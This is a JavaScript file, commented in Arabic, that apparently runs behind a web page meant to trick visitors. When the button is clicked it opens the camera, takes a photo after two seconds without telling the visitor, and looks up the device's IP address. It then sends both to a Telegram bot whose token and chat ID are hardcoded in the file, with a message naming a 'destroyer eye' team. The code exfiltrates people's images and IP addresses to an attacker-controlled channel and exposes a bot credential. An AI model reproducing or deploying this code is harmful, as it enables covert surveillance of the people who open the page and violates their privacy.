const botToken = "8139953747:AAFEaFIHMO9cYolhoT79ZfJTUUQ2-WWLIC0";  // 🔴 استبدل بالتوكن الخاص بك
const chatId = "7606838586";  // 🔴 استبدل بـ Chat ID الخاص بك

document.getElementById("startBtn").addEventListener("click", async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.style.display = "block";

        // جلب عنوان الـ IP للجهاز عند السماح بالوصول إلى الكاميرا
        const ip = await getIPAddress();

        setTimeout(() => captureImage(ip), 2000); // التقاط الصورة بعد ثانيتين تلقائيًا
    } catch (error) {
        console.error("تم رفض الوصول إلى الكاميرا");
    }
});

// وظيفة للحصول على عنوان الـ IP
async function getIPAddress() {
    try {
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("حدث خطأ أثناء جلب عنوان الـ IP:", error);
        return null;
    }
}

function captureImage(ip) {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => sendToTelegram(blob, ip), "image/jpeg");
}

async function sendToTelegram(blob, ip) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob, "photo.jpg");

    // إرسال الصورة أولاً
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
        });

        // ثم إرسال رسالة تحتوي على عنوان الـ IP والنص بعد إرسال الصورة
        const message = `تم التقديم من قبل فريق العين المدمرة\nعنوان IP للجهاز: ${ip}`;
        const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        await fetch(messageUrl);

        // الآن إرسال رابط الموقع الخاص بك
        const siteLink = "https://www.example.com";  // استبدل بالرابط الخاص بك
        const siteMessage = `تفضل رابط الموقع الخاص بنا: ${siteLink}`;

        // إرسال رسالة تحتوي على رابط الموقع
        const siteMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(siteMessage)}`;

        await fetch(siteMessageUrl);

    } catch (error) {
        console.error("حدث خطأ أثناء الإرسال:", error);
    }
}

